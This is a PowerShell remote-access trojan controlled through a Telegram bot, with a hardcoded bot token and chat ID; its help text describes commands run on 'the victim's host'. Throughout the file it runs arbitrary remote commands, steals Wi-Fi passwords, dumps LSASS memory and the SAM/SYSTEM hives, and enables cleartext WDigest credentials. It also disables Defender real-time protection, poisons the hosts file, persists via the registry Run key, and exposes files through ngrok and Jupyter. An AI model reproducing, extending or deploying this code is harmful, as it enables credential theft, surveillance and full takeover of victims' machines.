
function run-asAdmin($path,$password)
{
    if (is-administartor)
    {
        return "alredy ru as admin."
    }
    $vbscript = @('set WshShell = WScript.CreateObject("WScript.Shell")'
    'WshShell.Run "cmd"'
    'WScript.Sleep 100 '
    'WshShell.AppActivate'+ "C:\Windows\system32\cmd.exe"
    'WScript.Sleep 100'
    'WshShell.SendKeys'+ "runas /user:administrator $path"
    'WshShell.SendKeys'+ "{ENTER}"
    'WshShell.SendKeys'+ "$password"
    'WshShell.SendKeys'+ "{ENTER}")
    echo '' > vbscript.vbs
    foreach($i in $vbscript)
    {
        echo "$i`n" >> vbscript.vbs
    }
    start-process vbscript.vbs
}

function read-comm()
{
    Param
    (
       [Parameter(Mandatory=$true, Position=0)]
        $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $offset
   )
    $url="https://api.telegram.org/bot$apiToken/getUpdates?offset=$offset"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing
    $ProgressPreference = 'Continue'
    $test = $r | ConvertFrom-Json
    $message = $test.result.message[-1]
    $message = $message.text
    $offset = $test.result.update_id[-1]
    return $message, $offset
}



function Excmd
{

   param
   (
        [Parameter(Mandatory)]
        [string] $command
    )
    try{
        $out = Invoke-Expression -Command $command | Out-String
        return $out
    }
    catch{
        return "Failed to run command"
    }
   
}


function Send-data ($data,$apiToken,$chat_id)
{
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$data"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url
    $ProgressPreference = 'Continue'
    
}


function First-offset
{
    Param
    (
         [Parameter(Mandatory=$true, Position=0)]
         [string] $apiToken
    )

    $url = "https://api.telegram.org/bot$apiToken/getUpdates?offset="
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing | ConvertFrom-Json
    $ProgressPreference = 'Continue'
    $Foffset = $r.result.update_id
    $foo = $Foffset[-1]
    if ($foo.ToString().Length -gt 1)
    {
        return $foo
    }
    else
    {
        return $Foffset
    }

}

function get-wifiPasswords
{   
    $test = netsh wlan show profiles
    $profiles = @()
    foreach($i in $test)
    {
        if($i.contains("All User Profile"))
        {
            $profiles+=$i.Split(':')[-1].Trim()
        }
    }
    $passwords = ""
    foreach($i in $profiles)
    {
        $password = netsh wlan show profile $i key = clear
        if (([string]$password).Contains("Key Content"))
        {
            foreach($n in $password)
            {
                if ($n.contains("Key Content"))
                {
                    $keyCon = $n.split(' : ')[-1].Trim()
                    $passwords+="$i     :    $keyCon`n"
                }
            }
        }
    }
    return $passwords
}



function start-myshell($apiToken,$chat_id,$urlToNG)
{
    # Param
    # (
    #     [Parameter(Mandatory=$true, Position=0)]
    #     [string] $apiToken,
    #     [Parameter(Mandatory=$true, Position=1)]
    #     [string] $chat_id
    #     [Parameter(Mandatory=$true, Position=2)]
    #     [string] $urlToNG
    # )

    $currentuser = [System.Environment]::UserName
    $currentip = (Test-Connection -ComputerName $env:computername -count 1).IPv4Address.IPAddressToString
    Send-data -data "User $currentuser is Connected!" -chat_id $chat_id -apiToken $apiToken
    if (-not($urlToNG -eq $null))
    {
        Send-data -apiToken $apiToken -chat_id $chat_id -data "Ngrok url of $currentip is : $urlToNG"
    }
    $addpers = Add-Run
    if ($addpers -like "Added")
    {
        Send-data -apiToken $apiToken -chat_id $chat_id -data "successfully added program to the registry!"
    }
    else{
        if($addpers -eq $false)
        {
           Send-data -apiToken $apiToken -chat_id $chat_id -data "failed to add item to the registry!" 
        }
    }

    $offset = First-offset $apiToken
    $foo = $offset
    while ($true)
    {
        try
        {   
            
            $message = read-comm -apiToken $apiToken -offset $offset
            $offset = $message[1]
            if ($offset.contains(" "))
            {
                $offset = -split $offset
                $offset = $offset[-1]
            }

            
            if (-not($offset -eq $foo))
            {
                $foo=$offset
                $command = $message[0]

                if ($command.contains('get wifi passwords'))
                {
                    $output = get-wifiPasswords
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                }

                ElseIf($command.contains('save password as clear text'))
                {
                    $output = savePassword-clearText
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken   
                }

                ElseIf($command.contains('get dump lsass file'))
                {
                    if((is-administartor) -eq $false)
                    {
                        Send-data -data "Command must be exicuted as admin" -chat_id $chat_id -apiToken $apiToken 
                    }
                    else{
                        $output = get-lssasDump
                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
                    }  
                }

                ElseIf($command.contains('force run as admin -p'))
                {
                    $password = ($command.split('-p')[0]).Trim()
                    $path = [Environment]::GetCommandLineArgs()[0]
                    $path = [string]$path
                    run-asAdmin -path $path -password $password
                    # $output run-asAdmin -password $pass -path $path 
                }
                ElseIf($command.contains('get dump sam file'))
                {
                    if((is-administartor) -eq $false)
                    {
                        Send-data -data "Command must be exicuted as admin" -chat_id $chat_id -apiToken $apiToken 
                    }
                    else{
                        $output = dump-sam
                        foreach($i in $output)
                        {
                            Send-data -data $i -chat_id $chat_id -apiToken $apiToken  
                        }
                    }
                }
                ElseIf($command.contains('disable real time protecion'))
                {
                    $output = disable-protection
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken 
                }
                ElseIf($command.contains('route dns host -h'))
                    {
                        $hostd = ($command.Replace("route dns host -h",'')).split('-d')[0].Trim()
                        $domain = ($command.Replace("route dns host -h",'')).split('-d')[-1].Trim()
                        $output = mod-host -hostd $hostd -domain $domain
                        echo $output
                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                    }
                ElseIf($command.contains('get file -p'))
                {
                    $path = ($command.Replace("get file -p",'')).Trim()
                    $urlToNG = Get-ngrokToken
                    if ($urlToNG -eq $false)
                    {
                        Send-data -data "failed to extract ngrok url try again later" -chat_id $chat_id -apiToken $apiToken 
                    }
                    else{
                        $output = get-file -path $path -urlToNG $urlToNG
                        Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf($command.contains('get real time protection status'))
                {
                    if (IsMonitoring-Disable){
                        Send-data -data "Real time protection is disable!" -chat_id $chat_id -apiToken $apiToken
                    }
                    else{
                        Send-data -data "Real-time protection is enabled -_-" -chat_id $chat_id -apiToken $apiToken
                    }
                }
                ElseIf(([string]$command.Trim()) -like "-help")
                {
                    $output = get-MyHelp
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                }
                else{
                    $output = Excmd $command
                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                }
            }
        }    
        
        catch 
        {
            $errors = 1
        }
        Start-Sleep -Seconds 1  
    } 

}

function start-ngrok($port,$path)
{
    "taskkill /IM ngrok.exe /F >nul: 2>nul:" | cmd -ErrorAction SilentlyContinue | Out-Null
    $path = "$path\ngrok.exe"
    $arrgs = "http $port"
    start-process $path -ArgumentList $arrgs -WindowStyle hidden | Out-Null
}

function Start-Jupyter($token,$port)
{
    $arrgs = "--ip 0.0.0.0 --no-browser --port=$port --allow-root --NotebookApp.token='$token'" 
    start-process "jupyter-notebook.EXE" -ArgumentList "$arrgs" -WindowStyle hidden
}

function Get-ngrokToken()
{
    try
    {
        $res = Invoke-WebRequest http://localhost:4040/api/tunnels
        $res = $res | ConvertFrom-Json
        $res = $res.tunnels ; $res = $res.public_url
        return $res
    }
    catch
    {
        try
        {
            $res = curl  http://localhost:4040/api/tunnels
            $res = $res | ConvertFrom-Json
            $res = $res.tunnels ; $res = $res.public_url
            return $res
        }
        catch{
            return $false
        }
    }
   
}

function Start-JupShell($port,$pathToNg,$token)
{
    $pro = Get-Process | where ProcessName -like *jupyter-notebook*
    $pro = $pro.Id

    foreach($i in $pro)
    {
        Stop-Process -Id $i -ErrorAction SilentlyContinue | Out-Null
    }

    try
    {
        start-jupyter -token $token -port $port
        start-ngrok -path $pathToNg -port $port
        return get-ngrokToken
    }
    catch
    {
        return "Error was occurred while processing" 
    }
}




function mod-host($hostd,$domain)
{
    $cont = Get-Content "C:\Windows\System32\drivers\etc\hosts"
    if (-not("$hostd $domain" -in $cont))
    {
        try
        {
            echo "`n$hostd $domain" >> "C:\Windows\System32\drivers\etc\hosts"
            return 'Successfully completed'
        }
        catch{
            if (is-administartor)
            {
                return "Failed to execute the command -_-"
            }
        }   return 'The command must be executed with admin permission.'
    }
    return "already exist in hosts file"
    return "$hostd $domain already exist in hosts file"
}

function Add-Run
{
    $name = "testRun"
    $value = [Environment]::GetCommandLineArgs()[0]
    $regloc = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    $key = Get-Item -LiteralPath $regloc
    
    if ($key.GetValue($name, $null) -eq $null)
    {
        try
        {
            New-ItemProperty -Path $regloc -Name $name -Value $value -ErrorAction SilentlyContinue | Out-Null
        }
        catch
        {
            $err = 1
        }
        if (-not($key.GetValue($name, $null) -eq $null))
        {
            return "Added"
        }
        else
        {
            return $false
        }
    }
    return $true
}


function is-administartor
{
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function get-file($path,$urlToNG)
{
    if(([System.IO.File]::Exists($path)) -eq $false)
    {
        return "File doesn't exist"
    }
    $file = Get-Item $path
    $basename = $file.basename + $file.Extension
    $path = $file.DirectoryName
    $path = ($path.replace(($PWD | select -Expand Path),"")).split('\')
    $baseUrl = ""
    foreach($i in $path)
    {
        $baseUrl+="$i/"
    }
    return "$urlToNG/edit/$baseUrl$basename"
}

function get-lssasDump
{
    $res = Invoke-WebRequest http://localhost:4040/api/tunnels
    $res = $res | ConvertFrom-Json
    $res = $res.tunnels ; $urll = $res.public_url
    try
    {
        $Base64String = 'cHJvY2R1bXAgLW1hIGxzYXNzLmV4ZSBDOgpncm9rXGxzc2Fzcy5kbXAgfCBvdXQtc3RyaW5n'
        $commt = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Base64String))
        $test = Invoke-Expression -Command $commt
       if($test.contains('Access is denied'))
       {
           return 'Error while trying to creat dump file. "access denied"'
       }
    }
    catch{
        return 'Error while trying to creat dump file. "access denied"'
    }
    return get-file -urlToNG $urll -path "C:\ngrok\lssass.dmp"
}

function get-base64OfFile($path,$urlToNG)
{
    $file = Get-Item $path
    $basename = $file.basename + $file.Extension
    $path = $file.DirectoryName
    $loc = "$urlToNG/edit$basename"
    Copy-Item -Path path -Destination [System.Environment]::CurrentDirectory
    return ""
}

function dump-sam{
    $ngrokUrl = get-ngrokToken
    $files = @()
    try{
        remove-item C:\ngrok\dumps -Recurse -ErrorAction SilentlyContinue| out-null
        mkdir C:\ngrok\dumps | out-null
    }
    catch{
        mkdir C:\ngrok\dumps | out-null
    }
    echo y | reg save hklm\sam C:\ngrok\dumps\sam | out-null
    echo y | reg save hklm\system C:\ngrok\dumps\system | out-null
    $files+=get-file -path 'C:\ngrok\dumps\sam' -urlToNG $ngrokUrl
    $files+=get-file -path 'C:\ngrok\dumps\system' -urlToNG $ngrokUrl
    return $files 
}

function IsMonitoring-Disable
{
    return (get-MpPreference | select DisableRealtimeMonitoring).DisableRealtimeMonitoring
}


function disable-protection
{
    if ((is-administartor) -eq $false)
    {
        return "Program must run as admin."
    }
    if (IsMonitoring-Disable)
    {
        return "Real time protection is alredy Disable."
    }
    try{
        
        $testDisable = Set-MpPreference -DisableRealtimeMonitoring $true
        if ($testDisable -eq $null)
        {
            return "Successfully completed"
        } 
    }catch{
        return "Error has occurred"
    }
}

function get-MyHelp
{
    $help = @(
    "You are able to run normal commands on the victim's host, however there are several built-in commands to gain additional insights."
    "---------------------------------------------------------------"
    "[+] get wifi passwords" 
    "Description: Steal Wifi passwords" 
    "`n"
    "[+] save password as clear text"  
    "Description: Save all new logon lsass passwords as in clear text (Used to help dump lsass)"
    "`n"
    "[+] get dump lsass file  Description:" 
    "Gather lsass passwords for all users" 
    "`n"
    "[+] force run as admin -p <password>  "
    "Description: Run VBS script to forcelly run as admin with password (Ex. 'force run as admin -p 1234')"
    "`n"
    "[+] get dump lsass file " 
    "Description: Gather all lsass passwords and credentials for all users including Kerberos tickes"
    "`n"
    "[+] get dump sam file"  
    "Description: Gather all logon passwords hashes for all users "
    "`n"
    "[+] disable real time protecion"  
    "Description: Might require external premissions"
    "`n"
    "[+] route dns host -h <host> -d <domain> " 
    "Description: Modify the hosts file to overwright IP to a selected domain (DNS poisining)"
    "`n"
    "[+] get file -p <path> " 
    "Description: Generate Ngrok URL for a file in the host (Requires full file path)"
    "`n"
    "[+] get real time protection status"  
    "Description: Check if Real time Protection is Enable/Disable"
    )
    $helhelp
    foreach($i in $help)
    {
        $helhelp+="$i`n"
    }
    return $helhelp
}

function savePassword-clearText
{
    if ((is-administartor)-eq $false)
    {
        return "Must run as admin"
    }
    try{
        echo y | reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
        return "Successfully completed!"
    }
    catch 
    {
        return "Failed!"
    }
}


Set-Location C:\
try
{
    $path_to_ngrok = "C:\ngrok\ngrok.exe"
    if(([System.IO.File]::Exists($path_to_ngrok)) -eq $false)
    {
        mkdir C:\ngrok
        Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
        Expand-Archive C:\ngrok\ngrok.zip -Destination C:\ngrok
        ngrok config add-authtoken "29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR"
    }
    $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
}
catch{
    $err = 1
}

$apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
$chat_id = '-1001830797904'
start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG

